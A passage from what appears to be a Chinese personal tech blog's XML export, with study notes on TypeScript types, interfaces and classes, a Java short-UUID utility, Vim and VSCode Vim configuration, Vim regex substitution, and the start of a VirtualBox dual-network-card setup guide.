enum Color &#123;Red &#x3D; 1, Green, Blue&#125; &#x2F;&#x2F; Green -&gt; 2 一次类推
let c: Color &#x3D; Color.Green;
console.log(colorName);  &#x2F;&#x2F; 显示&#39;Green&#39;因为上面代码里它的值是2

enum Color &#123;Red &#x3D; 1, Green &#x3D; 2, Blue &#x3D; 4&#125; &#x2F;&#x2F; 手动赋值
let c: Color &#x3D; Color.Green;

Anylet notSure: any &#x3D; 4;
notSure &#x3D; &quot;maybe a string instead&quot;;
notSure &#x3D; false; &#x2F;&#x2F; okay, definitely a boolean

let notSure: any &#x3D; 4;
notSure.ifItExists(); &#x2F;&#x2F; okay, ifItExists might exist at runtime
notSure.toFixed(); &#x2F;&#x2F; okay, toFixed exists (but the compiler doesn&#39;t check)

let prettySure: Object &#x3D; 4;
prettySure.toFixed(); &#x2F;&#x2F; Error: Property &#39;toFixed&#39; doesn&#39;t exist on type &#39;Object&#39;.

let list: any[] &#x3D; [1, true, &quot;free&quot;];
list[1] &#x3D; 100;

Voidfunction warnUser(): void &#123;
    console.log(&quot;This is my warning message&quot;);
&#125;

let unusable: void &#x3D; undefined;

Null 和 Undefined&#x2F;&#x2F; Not much else we can assign to these variables!
let u: undefined &#x3D; undefined;
let n: null &#x3D; null;

Never&#x2F;&#x2F; 返回never的函数必须存在无法达到的终点
function error(message: string): never &#123;
    throw new Error(message);
&#125;

&#x2F;&#x2F; 推断的返回值类型为never
function fail() &#123;
    return error(&quot;Something failed&quot;);
&#125;

&#x2F;&#x2F; 返回never的函数必须存在无法达到的终点
function infiniteLoop(): never &#123;
    while (true) &#123;
    &#125;
&#125;

Objectdeclare function create(o: object | null): void;

create(&#123; prop: 0 &#125;); &#x2F;&#x2F; OK
create(null); &#x2F;&#x2F; OK

create(42); &#x2F;&#x2F; Error
create(&quot;string&quot;); &#x2F;&#x2F; Error
create(false); &#x2F;&#x2F; Error
create(undefined); &#x2F;&#x2F; Error

类型断言let someValue: any &#x3D; &quot;this is a string&quot;;
let strLength: number &#x3D; (&lt;string&gt;someValue).length;

let someValue: any &#x3D; &quot;this is a string&quot;;
let strLength: number &#x3D; (someValue as string).length;

变量声明
https://www.tslang.cn/docs/handbook/variable-declarations.html

var a &#x3D; 10;

let hello &#x3D; &quot;Hello!&quot;;

const numLivesForCat &#x3D; 9;

解构解构数组let input &#x3D; [1, 2];
let [first, second] &#x3D; input;
console.log(first); &#x2F;&#x2F; outputs 1
console.log(second); &#x2F;&#x2F; outputs 2

&#x2F;&#x2F; swap variables
[first, second] &#x3D; [second, first];

function f([first, second]: [number, number]) &#123;
    console.log(first);
    console.log(second);
&#125;
f(input);

let [first, ...rest] &#x3D; [1, 2, 3, 4];
console.log(first); &#x2F;&#x2F; outputs 1
console.log(rest); &#x2F;&#x2F; outputs [ 2, 3, 4 ]

let [first] &#x3D; [1, 2, 3, 4];
console.log(first); &#x2F;&#x2F; outputs 1

let [, second, , fourth] &#x3D; [1, 2, 3, 4];

对象解构let o &#x3D; &#123;
    a: &quot;foo&quot;,
    b: 12,
    c: &quot;bar&quot;
&#125;;
let &#123; a, b &#125; &#x3D; o;

(&#123; a, b &#125; &#x3D; &#123; a: &quot;baz&quot;, b: 101 &#125;);

let &#123; a, ...passthrough &#125; &#x3D; o;
let total &#x3D; passthrough.b + passthrough.c.length;

属性重命名let &#123; a: newName1, b: newName2 &#125; &#x3D; o;
&#x2F;&#x2F; &#x3D;&#x3D;&#x3D; 等价 &#x3D;&#x3D;&#x3D;
let newName1 &#x3D; o.a;
let newName2 &#x3D; o.b;

let &#123;a, b&#125;: &#123;a: string, b: number&#125; &#x3D; o;

默认值function keepWholeObject(wholeObject: &#123; a: string, b?: number &#125;) &#123;
    let &#123; a, b &#x3D; 1001 &#125; &#x3D; wholeObject;
&#125;

函数声明type C &#x3D; &#123; a: string, b?: number &#125;
function f(&#123; a, b &#125;: C): void &#123;
    &#x2F;&#x2F; ...
&#125;

function f(&#123; a&#x3D;&quot;&quot;, b&#x3D;0 &#125; &#x3D; &#123;&#125;): void &#123;
    &#x2F;&#x2F; ...
&#125;
f();

function f(&#123; a, b &#x3D; 0 &#125; &#x3D; &#123; a: &quot;&quot; &#125;): void &#123;
    &#x2F;&#x2F; ...
&#125;
f(&#123; a: &quot;yes&quot; &#125;); &#x2F;&#x2F; ok, default b &#x3D; 0
f(); &#x2F;&#x2F; ok, default to &#123;a: &quot;&quot;&#125;, which then defaults b &#x3D; 0
f(&#123;&#125;); &#x2F;&#x2F; error, &#39;a&#39; is required if you supply an argument

展开let first &#x3D; [1, 2];
let second &#x3D; [3, 4];
let bothPlus &#x3D; [0, ...first, ...second, 5]; &#x2F;&#x2F; [0, 1, 2, 3, 4, 5]

let defaults &#x3D; &#123; food: &quot;spicy&quot;, price: &quot;$$&quot;, ambiance: &quot;noisy&quot; &#125;;
let search &#x3D; &#123; ...defaults, food: &quot;rich&quot; &#125;; &#x2F;&#x2F; &#123; food: &quot;rich&quot;, price: &quot;$$&quot;, ambiance: &quot;noisy&quot; &#125;

let defaults &#x3D; &#123; food: &quot;spicy&quot;, price: &quot;$$&quot;, ambiance: &quot;noisy&quot; &#125;;
let search &#x3D; &#123; food: &quot;rich&quot;, ...defaults &#125;; &#x2F;&#x2F; defaults里的food属性会重写food: &quot;rich&quot;

对象展开还有其它一些意想不到的限制。 首先，它仅包含对象 自身的可枚举属性。 大体上是说当你展开一个对象实例时，你会丢失其方法：
class C &#123;
  p &#x3D; 12;
  m() &#123;
  &#125;
&#125;
let c &#x3D; new C();
let clone &#x3D; &#123; ...c &#125;;
clone.p; &#x2F;&#x2F; ok
clone.m(); &#x2F;&#x2F; error!

接口
https://www.tslang.cn/docs/handbook/interfaces.html

TypeScript的核心原则之一是对值所具有的结构进行类型检查。 它有时被称做“鸭式辨型法”或“结构性子类型化”。 在TypeScript里，接口的作用就是为这些类型命名和为你的代码或第三方代码定义契约。
function printLabel(labelledObj: &#123; label: string &#125;) &#123;
  console.log(labelledObj.label);
&#125;

let myObj &#x3D; &#123; size: 10, label: &quot;Size 10 Object&quot; &#125;;
printLabel(myObj);

变形
interface LabelledValue &#123;
  label: string;
&#125;

function printLabel(labelledObj: LabelledValue) &#123;
  console.log(labelledObj.label);
&#125;

let myObj &#x3D; &#123;size: 10, label: &quot;Size 10 Object&quot;&#125;;
printLabel(myObj);

可选属性interface SquareConfig &#123;
  color?: string; &#x2F;&#x2F; 带有可选属性的接口与普通的接口定义差不多，只是在可选属性名字定义的后面加一个?符号。
  width?: number;
&#125;

&#x2F;*
可选属性的优势
    一、可以对可能存在的属性进行预定义
    二、可以捕获引用了不存在的属性时的错误。 
比如，我们故意将 createSquare里的color属性名拼错，就会得到一个错误提示
*&#x2F;
function createSquare(config: SquareConfig): &#123;color: string; area: number&#125; &#123;
  let newSquare &#x3D; &#123;color: &quot;white&quot;, area: 100&#125;;
  if (config.clor) &#123;
    &#x2F;&#x2F; Error: Property &#39;clor&#39; does not exist on type &#39;SquareConfig&#39;
    newSquare.color &#x3D; config.clor;
  &#125;
  if (config.width) &#123;
    newSquare.area &#x3D; config.width * config.width;
  &#125;
  return newSquare;
&#125;

let mySquare &#x3D; createSquare(&#123;color: &quot;black&quot;&#125;);

只读属性interface Point &#123;
    &#x2F;*
    一些对象属性只能在对象刚刚创建的时候修改其值。
    你可以在属性名前用 readonly来指定只读属性
    *&#x2F;
    readonly x: number;
    readonly y: number;
&#125;

&#x2F;&#x2F; TypeScript具有ReadonlyArray&lt;T&gt;类型，它与Array&lt;T&gt;相似，只是把所有可变方法去掉了，因此可以确保数组创建后再也不能被修改
let a: number[] &#x3D; [1, 2, 3, 4];
let ro: ReadonlyArray&lt;number&gt; &#x3D; a;
ro[0] &#x3D; 12; &#x2F;&#x2F; error!
ro.push(5); &#x2F;&#x2F; error!
ro.length &#x3D; 100; &#x2F;&#x2F; error!
a &#x3D; ro; &#x2F;&#x2F; error!
a &#x3D; ro as number[]; &#x2F;&#x2F; ok

额外的属性检查函数类型interface SearchFunc &#123;
  (source: string, subString: string): boolean;
&#125;

let mySearch: SearchFunc;
&#x2F;&#x2F; 函数的参数名不需要与接口里定义的名字相匹配
&#x2F;&#x2F; mySearch &#x3D; function(source: string, subString: string) &#123;
mySearch &#x3D; function(src: string, sub: string): boolean &#123;
  let result &#x3D; src.search(sub);
  return result &gt; -1;
&#125;

可索引的类型class Animal &#123;
    name: string;
&#125;
class Dog extends Animal &#123;
    breed: string;
&#125;

&#x2F;&#x2F; 错误：使用数值型的字符串索引，有时会得到完全不同的Animal!
interface NotOkay &#123;
    &#x2F;&#x2F; TypeScript支持两种索引签名：字符串和数字。
    &#x2F;&#x2F; 可以同时使用两种类型的索引，但是数字索引的返回值必须是字符串索引返回值类型的子类型。
    [x: number]: Animal;
    [x: string]: Dog;
&#125;

interface ReadonlyStringArray &#123;
    &#x2F;&#x2F; 可以将索引签名设置为只读，这样就防止了给索引赋值。
    readonly [index: number]: string;
&#125;
let myArray: ReadonlyStringArray &#x3D; [&quot;Alice&quot;, &quot;Bob&quot;];
myArray[2] &#x3D; &quot;Mallory&quot;; &#x2F;&#x2F; error!

类类型实现接口interface ClockInterface &#123;
    currentTime: Date;
    setTime(d: Date);
&#125;

&#x2F;&#x2F; 接口描述了类的公共部分，而不是公共和私有两部分。 它不会帮你检查类是否具有某些私有成员。
class Clock implements ClockInterface &#123;
    currentTime: Date;
    setTime(d: Date) &#123;
        this.currentTime &#x3D; d;
    &#125;
    constructor(h: number, m: number) &#123; &#125;
&#125;

类静态部分与实例部分的区别&#x2F;&#x2F; 定义了两个接口， ClockConstructor为构造函数所用和ClockInterface为实例方法所用。 
interface ClockConstructor &#123;
    new (hour: number, minute: number): ClockInterface; &#x2F;&#x2F; 静态部分
&#125;
interface ClockInterface &#123;
    tick(); &#x2F;&#x2F; 实例部分
&#125;
&#x2F;&#x2F; 定义一个构造函数 createClock，它用传入的类型创建实例。
function createClock(ctor: ClockConstructor, hour: number, minute: number): ClockInterface &#123;
    return new ctor(hour, minute);
&#125;

class DigitalClock implements ClockInterface &#123;
    &#x2F;&#x2F; 因为当一个类实现了一个接口时，只对其实例部分进行类型检查。
    constructor(h: number, m: number) &#123; &#125;
    tick() &#123;
        console.log(&quot;beep beep&quot;);
    &#125;
&#125;
class AnalogClock implements ClockInterface &#123;
    constructor(h: number, m: number) &#123; &#125;
    tick() &#123;
        console.log(&quot;tick tock&quot;);
    &#125;
&#125;
&#x2F;&#x2F; 因为createClock的第一个参数是ClockConstructor类型，在createClock(AnalogClock, 7, 32)里，会检查AnalogClock是否符合构造函数签名。
let digital &#x3D; createClock(DigitalClock, 12, 17);
let analog &#x3D; createClock(AnalogClock, 7, 32);

继承接口interface Shape &#123;
    color: string;
&#125;

interface PenStroke &#123;
    penWidth: number;
&#125;

interface Square extends Shape, PenStroke &#123;
    sideLength: number;
&#125;

let square &#x3D; &lt;Square&gt;&#123;&#125;;
square.color &#x3D; &quot;blue&quot;;
square.sideLength &#x3D; 10;
square.penWidth &#x3D; 5.0;

混合类型interface Counter &#123;
    (start: number): string;
    interval: number;
    reset(): void;
&#125;

function getCounter(): Counter &#123;
    let counter &#x3D; &lt;Counter&gt;function (start: number) &#123; &#125;;
    counter.interval &#x3D; 123;
    counter.reset &#x3D; function () &#123; &#125;;
    return counter;
&#125;

&#x2F;&#x2F; 一个对象可以同时做为函数和对象使用，并带有额外的属性。
let c &#x3D; getCounter();
c(10);
c.reset();
c.interval &#x3D; 5.0;

接口继承类
当接口继承了一个类类型时，它会继承类的成员但不包括其实现。
 接口同样会继承到类的private和protected成员。
这意味着当你创建了一个接口继承了一个拥有私有或受保护的成员的类时，这个接口类型只能被这个类或其子类所实现（implement）。

class Control &#123;
    private state: any;
&#125;

interface SelectableControl extends Control &#123;
    select(): void;
&#125;

class Button extends Control implements SelectableControl &#123;
    select() &#123; &#125;
&#125;

class TextBox extends Control &#123;
    select() &#123; &#125;
&#125;

&#x2F;&#x2F; 错误：“Image”类型缺少“state”属性。
class Image implements SelectableControl &#123;
    select() &#123; &#125;
&#125;

class Location &#123;
&#125;

类作用域关键字

public 无限制访问（默认）
private 仅在本类中访问
protected 在派生类中仍然可以访问

&#x2F;&#x2F; 抽象类
abstract class Department &#123;
	
    constructor(public name: string) &#123;
    &#125;

    printName(): void &#123;
        console.log(&#39;Department name: &#39; + this.name);
    &#125;

    abstract printMeeting(): void; &#x2F;&#x2F; 必须在派生类中实现
&#125;

&#x2F;&#x2F; 继承
class AccountingDepartment extends Department &#123;
    &#x2F;&#x2F; 静态属性，可以通过AccountingDepartment.test来访问
	static test &#x3D; &#39;test&#39;;
    
    private _departmentName: string;
    
    &#x2F;&#x2F; 只读属性必须在声明时或构造函数里被初始化
    protected readonly departmentLogo: string &#x3D; &quot;★&quot;;
    
    constructor() &#123;
        super(&#39;Accounting and Auditing&#39;); &#x2F;&#x2F; 在派生类的构造函数中必须调用 super()
    &#125;
    
    &#x2F;&#x2F; 参数属性test2
    constructor(private readonly test2: string) &#123;
        super(&#39;Accounting and Auditing&#39;);
    &#125;
    
    &#x2F;&#x2F; 存取器
    get departmentName(): string &#123;
        return this._departmentName
    &#125;
    set departmentName(newName: string) &#123;
        this._departmentName &#x3D; newName;
    &#125;

    &#x2F;&#x2F; 实现抽象方法
    printMeeting(): void &#123;
        console.log(&#39;The Accounting Department meets each Monday at 10am.&#39;);
    &#125;

    generateReports(): void &#123;
        console.log(&#39;Generating accounting reports...&#39;);
    &#125;
&#125;

let department: Department; &#x2F;&#x2F; 允许创建一个对抽象类型的引用
department &#x3D; new Department(); &#x2F;&#x2F; 错误: 不能创建一个抽象类的实例
department &#x3D; new AccountingDepartment(); &#x2F;&#x2F; 允许对一个抽象子类进行实例化和赋值
department.printName();
department.printMeeting();
department.generateReports(); &#x2F;&#x2F; 错误: 方法在声明的抽象类中不存在

]]></content>
      <tags>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>UUIDShort-java</title>
    <url>/2021/07/06/UUIDShort-java/</url>
    <content><![CDATA[UUID工具类


import java.security.SecureRandom;
import java.util.UUID;

&#x2F;**
 * 长度为16的 UUID 字符串生成器， 仿 java.util.UUID 实现，修改内容如下： 将16位byte数组缩短为10位，将16进制字符转换改为32进制转换
 *&#x2F;
public class UUIDShort &#123;

    private static char[] digits &#x3D; &#123; &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39; &#125;;

    private static String toUnsignedString(long i, int shift) &#123;
        char[] buf &#x3D; new char[64];
        int charPos &#x3D; 64;
        int radix &#x3D; 1 &lt;&lt; shift;
        long mask &#x3D; radix - 1;
        do &#123;
            buf[--charPos] &#x3D; digits[(int) (i &amp; mask)];
            i &gt;&gt;&gt;&#x3D; shift;
        &#125; while (i !&#x3D; 0);
        return new String(buf, charPos, (64 - charPos));
    &#125;

    private static SecureRandom ng &#x3D; new SecureRandom();

    &#x2F;**
     * 生成一个长度为16的随机字符串
     *
     * @return
     *&#x2F;
    public static String random16() &#123;
        byte[] data &#x3D; new byte[10];
        ng.nextBytes(data);
        long msb &#x3D; 0;
        long lsb &#x3D; 0;
        for (int i &#x3D; 0; i &lt; 5; i++) &#123;
            msb &#x3D; (msb &lt;&lt; 8) | (data[i] &amp; 0xff);
        &#125;
        for (int i &#x3D; 5; i &lt; 10; i++) &#123;
            lsb &#x3D; (lsb &lt;&lt; 8) | (data[i] &amp; 0xff);
        &#125;
        String random &#x3D; toUnsignedString(msb, 5) + toUnsignedString(lsb, 5);
        if (random.length() &lt; 16) &#123;
            for (int i &#x3D; 0; i &lt; 16 - random.length(); i++) &#123;
                random &#x3D; digits[ng.nextInt(36)] + random;
            &#125;
        &#125;
        return random;
    &#125;

    public static String random32() &#123;
        return UUID.randomUUID().toString();
    &#125;

&#125;
]]></content>
  </entry>
  <entry>
    <title>VSCod安装Vim及拼音切换问题</title>
    <url>/2021/03/16/VSCode%E5%AE%89%E8%A3%85Vim%E5%8F%8A%E6%8B%BC%E9%9F%B3%E5%88%87%E6%8D%A2%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[安装插件https://github.com/VSCodeVim/Vim
解决切换拼音输入法问题https://github.com/daipeihust/im-selecthttps://www.zhihu.com/question/303850876/answer/822818615
&quot;vim.autoSwitchInputMethod.enable&quot;: true,
&quot;vim.autoSwitchInputMethod.defaultIM&quot;: &quot;1033&quot;,
&quot;vim.autoSwitchInputMethod.obtainIMCmd&quot;: &quot;C:\\Users\\JIAHE\\Desktop\\im-select.exe&quot;,
&quot;vim.autoSwitchInputMethod.switchIMCmd&quot;: &quot;C:\\Users\\JIAHE\\Desktop\\im-select.exe &#123;im&#125;&quot;
]]></content>
      <tags>
        <tag>Vim</tag>
        <tag>VSCode</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim常用配置</title>
    <url>/2021/02/03/Vim%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[
&quot; 基本配置 &quot;
set nocompatible &quot; 不与 Vi 兼容（采用 Vim 自己的操作命令）。
syntax on &quot; 打开语法高亮。自动识别代码，使用多种颜色显示。
set showmode &quot; 在底部显示，当前处于命令模式还是插入模式。
set showcmd &quot; 命令模式下，在底部显示，当前键入的指令。比如，键入的指令是2y3d，那么底部就会显示2y3，当键入d的时候，操作完成，显示消失。
set t_Co &#x3D; 256 &quot; 启动256色
&quot; 设置编码
set fileencodings&#x3D;utf-8,ucs-bom,gb18030,gbk,gb2312,cp936
set termencoding&#x3D;utf-8
set encoding&#x3D;utf-8
set langmenu&#x3D;zh_CN.UTF-8
if version &gt;&#x3D; 603
    set helplang&#x3D;cn
endif
&quot; 启用鼠标
set mouse &#x3D; a
set selection &#x3D; exclusive
set selectmode &#x3D; mouse, key
&quot; 打开文件类型检测
filetype plugin on
filetype indent on &quot; 开启文件类型检查，并且载入与该类型对应的缩进规则。比如，如果编辑的是.py文件，Vim 就是会找 Python 的缩进规则~&#x2F;.vim&#x2F;indent&#x2F;python.vim

&quot; 搜索相关 &quot;
set showmatch &quot; 光标遇到圆括号、方括号、大括号时，自动高亮对应的另一个圆括号、方括号和大括号
set hlsearch &quot; 高亮搜索匹配结果
set ignorecase &quot; 搜索时忽略大小写
set incsearch &quot; 搜索模式下，每输入一个字符，就自动跳至第一个匹配结果
set smartcase &quot; 同时打开了ignorecase, 仅对只有一个大写字母的单词敏感


&quot; 编辑相关 &quot;
set spell spelllang&#x3D;en_us &quot; 英语单词 拼写检查
set nobackup &quot; 不创建备份文件, 默认情况下，文件保存时，会额外创建一个备份文件，它的文件名是在原文件名的末尾，再添加一个波浪号（〜）
set noswapfile &quot; 不创建交换文件, 交换文件主要用于系统崩溃时恢复文件，文件名的开头是.、结尾是.swp
set undofile &quot; 保留撤销历史, Vim 会在编辑时保存操作历史，用来供用户撤消更改。默认情况下，操作记录只在本次编辑时有效，一旦编辑结束、文件关闭，操作历史就消失了。打开这个设置，可以在文件关闭后，操作记录保留在一个文件里面，继续存在。这意味着，重新打开一个文件，可以撤销上一次编辑时的操作。撤消文件是跟原文件保存在一起的隐藏文件，文件名以.un~开头。
set paste &quot; 粘贴模式
set autochdir &quot; 自动切换工作目录。这主要用在一个 Vim 会话之中打开多个文件的情况，默认的工作目录是打开的第一个文件的目录。该配置可以将工作目录自动切换到，正在编辑的文件的目录。
set visualbell &quot; 出错时，发出视觉提示，通常是屏幕闪烁。
set noerrorbells &quot; 出错时，不要发出响声。
set history &#x3D; 1000 &quot; Vim 需要记住多少次历史操作。
set listchars&#x3D;tab:»■,trail:■ &quot; 如果行尾有多余的空格（包括 Tab 键），该配置将让这些空格显示成可见的小方块。
set list
set wildmenu &quot; 命令模式下，底部操作指令按下 Tab 键自动补全。第一次按下 Tab，会显示所有匹配的操作指令的清单；第二次按下 Tab，会依次选择各个指令。
set wildmode&#x3D;longest:list,full


&quot; 外观相关 &quot;
set number &quot; 显示行号
set relativenumber &quot; 显示光标所在的当前行的行号，其他行都为相对于该行的相对行号
set guifont &#x3D; Courier_New:h10:cANSI &quot; 字体
set cursorline &quot; 光标所在的当前行高亮
set cursorcolumn &quot; 突显当前列
set textwidth &#x3D; 80
set wrap &quot; 自动折行，即太长的行分成几行显示, nowrap
set linebreak &quot; 只有遇到指定的符号（比如空格、连词号和其他标点符号），才发生折行。也就是说，不会在单词内部折行
set wrapmargin &#x3D; 2 &quot; 指定折行处与编辑窗口的右边缘之间空出的字符数
set scrolloff &#x3D; 5 &quot; 垂直滚动时，光标距离顶部&#x2F;底部的位置（单位：行）
&quot; set sidescrolloff &#x3D; 15 &quot; 水平滚动时，光标距离行首或行尾的位置（单位：字符）。该配置在不折行时比较有用
set laststatus &#x3D; 2 &quot; 是否显示状态栏。0 表示不显示，1 表示只在多窗口时显示，2 表示显示
set ruler &quot; 在状态栏显示光标的当前位置（位于哪一行哪一列）


&quot; 缩进相关 &quot;
set autoindent &quot; 按下回车键后，下一行的缩进会自动跟上一行的缩进保持一致。
set tabstop &#x3D; 4 &quot; Tab长度
set shiftwidth &#x3D; 4 &quot; 自动缩进长度
set expandtab &quot; 由于 Tab 键在不同的编辑器缩进不一致，该设置自动将 Tab 转为空格。
set softtabstop &#x3D; 4 &quot; Tab 转为多少个空格


&quot;让vimrc配置变更立即生效&quot;
autocmd BufWritePost $MYVIMRC source $MYVIMRC


]]></content>
      <tags>
        <tag>Vim</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim查找替换&amp;正则表达式</title>
    <url>/2021/06/24/Vim%E6%9F%A5%E6%89%BE%E6%9B%BF%E6%8D%A2&amp;%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[查找替换:[range]s/&#123;pattern&#125;/&#123;string&#125;/[flags]
:1,10s&#x2F;from&#x2F;to&#x2F; 表示在第1到第10行（包含第1，第10行）之间搜索替换
:10s&#x2F;from&#x2F;to&#x2F; 	表示只在第10行搜索替换
:%s&#x2F;from&#x2F;to&#x2F; 	表示在所有行中搜索替换
1,$s&#x2F;from&#x2F;to&#x2F; 	同上

flags 有如下四个选项

c        confirm，每次替换前询问；
e        error， 不显示错误；
g        globle，不询问，整行替换。如果不加 g 选项，则只替换每行的第一个匹配到的字符串；
i        ignore，忽略大小写
这些选项可以合并使用，如 cgi 表示不区分大小写，整行替换，替换前询问



正则表达式元字符匹配任意字符

[abc] 匹配方括号中的任意一个字符，可用-表示字符范围。如[a-z0-9]匹配小写字母和数字[^abc] 匹配除方括号中字符之外的任意字符
\d 匹配阿拉伯数字，等同于[0-9]
\D 匹配阿拉伯数字之外的任意字符，等同于[^0-9]
\x 匹配十六进制数字，等同于[0-9A-Fa-f]
\X 匹配十六进制数字之外的任意字符，等同于[^0-9A-Fa-f]
\l 匹配[a-z]
\L 匹配[^a-z]
\u 匹配[A-Z]
\U 匹配[^A-Z]
\w 匹配单词字母，等同于[0-9A-Za-z_]_
\W 匹配单词字母之外的任意字符，等同于[^0-9A-Za-z_]
\t 匹配&lt;TAB&gt;字符
\s 匹配空白字符，等同于[\t]
\S 匹配非空白字符，等同于[^\t]

普通字符需转义
\*     匹配*字符
\.     匹配.字符
\/     匹配/字符
\\       匹配\字符
\[     匹配[字符
\]     匹配]字符

表示数量的元字符
\.             匹配0-任意个
\+             匹配1-任意个
\?             匹配0-1个
\&#123;n,m&#125;     匹配n-m个
\&#123;n&#125;         匹配n个
\&#123;n,&#125;       匹配n-任意个
\&#123;,m&#125;       匹配0-m个

表示位置的元字符
$        匹配行尾
^        匹配行首
\&lt;      匹配单词词首
\&gt;      匹配单词词尾

替换变量在正则式中以(和)括起来的正则表达式，在后面使用的时候可以用\1、\2等变量来访问(和)中的内容
例子删除行尾空格：:%s/\s+$//g
删除行首多余空格：%s/^\s*// 或者 %s/^ *//
删除沒有內容的空行：%s/^$// 或者 g/^$/d
删除包含有空格组成的空行：%s/^\s*$// 或者 g/^\s*$/d
删除以空格或TAB开头到结尾的空行：%s/^[ |\t]*$// 或者 g/^[ |\t]*$/d
把文中的所有字符串“abc……xyz”替换为“xyz……abc”可以有下列写法
查找替换归纳总结简单替换表达式替换命令可以在全文中用一个单词替换另一个单词：:%s/four/4/g
&quot;%&quot; 范围前缀表示在所有行中执行替换。最后的 &quot;g&quot; 标记表示替换行中的所有匹配点。如果仅仅对当前行进行操作，那么只要去掉%即可。
如果你有一个象 &quot;thirtyfour&quot; 这样的单词，上面的命令会出错。这种情况下，这个单词会被替换成&quot;thirty4&quot;。要解决这个问题，用 &quot;\&lt;&quot; 来指定匹配单词开头：:%s/\&lt;four/4/g
显然，这样在处理 &quot;fourty&quot; 的时候还是会出错。用 &quot;\&gt;&quot; 来解决这个问题：:%s/\&lt;four\&gt;/4/g
如果你在编码，你可能只想替换注释中的 &quot;four&quot;，而保留代码中的。由于这很难指定，可以在替换命令中加一个 &quot;c&quot; 标记，这样，Vim 会在每次替换前提示你：:%s/\&lt;four\&gt;/4/gc
删除多余的空格要删除这些每行后面多余的空格，可以执行如下命令：:%s/\s\+$//
命令前面指明范围是 &quot;%&quot;，所以这会作用于整个文件。&quot;substitute&quot; 命令的匹配模式是&quot;\s\+$&quot;。
这表示行末（$）前的一个或者多个（+）空格（\s）。
替换命令的 &quot;to&quot; 部分是空的：&quot;//&quot;。这样就会删除那些匹配的空白字符。
匹配重复性模式星号项 * 规定在它前面的项可以重复任意次。
因此：/a*匹配 &quot;a&quot;，&quot;aa&quot;，&quot;aaa&quot;，等等。但也匹配 &quot;&quot; (空字串)，因为零次也包含在内。星号&quot;*&quot;仅仅应用于那个紧邻在它前面的项。
因此 &quot;ab*&quot; 匹配 &quot;a&quot;，&quot;ab&quot;，&quot;abb&quot;,&quot;abbb&quot;，等等。如要多次重复整个字符串，那么该字符串必须被组成一个项。组成一项的方法就是在它前面加 &quot;(&quot;，后面加 &quot;)&quot;。
因此这个命令：/\(ab\)*匹配: &quot;ab&quot;，&quot;abab&quot;，&quot;ababab&quot;，等等。而且也匹配 &quot;&quot;。要避免匹配空字串，使用 &quot;+&quot;。这表示前面一项可以被匹配一次或多次。
/ab\+匹配 &quot;ab&quot;，&quot;abb&quot;，&quot;abbb&quot;，等等。它不匹配 后面没有跟随 &quot;b&quot; 的 &quot;a&quot;。
要匹配一个可选项，用 &quot;=&quot;。 例如：/folders\=匹配 &quot;folder&quot; 和 &quot;folders&quot;。
指定重复次数要匹配某一项的特定次数重复，使用 &quot;{n,m}&quot; 这样的形式。其中 &quot;n&quot; 和 &quot;m&quot; 都是数字。在它前面的那个项将被重复 &quot;n&quot; 到 &quot;m&quot; 次 (|inclusive| 包含 &quot;n&quot; 和 &quot;m&quot;)。
例如：/ab\&#123;3,5&#125;匹配 &quot;abbb&quot;，&quot;abbbb&quot; 以及 &quot;abbbbb&quot;。
当 &quot;n&quot; 省略时，被默认为零。当 &quot;m&quot; 省略时，被默认为无限大。当 &quot;,m&quot; 省略时，就表示重复正好 &quot;n&quot; 次。例如:
模式			匹配次数
\&#123;,4&#125;        0，1，2，3 或 4
\&#123;3,&#125;        3，4，5，等等
\&#123;0,1&#125;       0 或 1，同 \&#x3D;
\&#123;0,&#125;        0 或 更多，同 *
\&#123;1,&#125;        1 或 更多，同 \+
\&#123;3&#125;         3


多选一匹配在一个查找模式中，&quot;或&quot; 运算符是 &quot;\|&quot;。
例如：/foo\|bar这个命令匹配了 &quot;foo&quot; 或 &quot;bar&quot;。
更多的抉择可以连在后面：/one\|two\|three匹配 &quot;one&quot;，&quot;two&quot; 或 &quot;three&quot;。
如要匹配其多次重复，那么整个抉择结构须置于 &quot;(&quot; 和 &quot;)&quot; 之间：/\(foo\|bar\)\+这个命令匹配 &quot;foo&quot;，&quot;foobar&quot;，&quot;foofoo&quot;，&quot;barfoobar&quot;，等等。
再举个例子：/end\(if\|while\|for\)这个命令匹配 &quot;endif&quot;，&quot;endwhile&quot;和&quot;endfor&quot;`。
]]></content>
      <tags>
        <tag>Vim</tag>
      </tags>
  </entry>
  <entry>
    <title>VirtualBox虚拟机配置双网卡访问内外网</title>
    <url>/2021/03/30/VirtualBox%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8F%8C%E7%BD%91%E5%8D%A1%E8%AE%BF%E9%97%AE%E5%86%85%E5%A4%96%E7%BD%91/</url>
    <content><![CDATA[宿主机：Windows 10
虚拟机：VirtualBox
虚拟机操作系统：CentOS 7
要求：虚拟机的 CentOS 7 与宿主机互通，并且虚拟操作系统能访问外网。


方案 1配置双网卡
网卡 1 使用 NAT 网络模式
网卡 2 使用 Host-Only 模式
虚拟机 CentOS 7 使用网卡 1 与外网通信，使用网卡 2 实现与主机以及其他虚拟机之间相互通信。
步骤1在 VirtualBox-&gt; 管理 -&gt; 全局设定 -&gt; 网络中查看 NAT 网络状态，已配置好 NAT 网络的全局设定如下所示。

也可以点击右边的加号自己添加 NAT 网络。
步骤2在 VirtualBox-&gt; 管理 -&gt; 主机网络管理器中查看是否有 Host-Only 网卡，没有则手动添加。
下图是配置好的 Host-Only 网卡

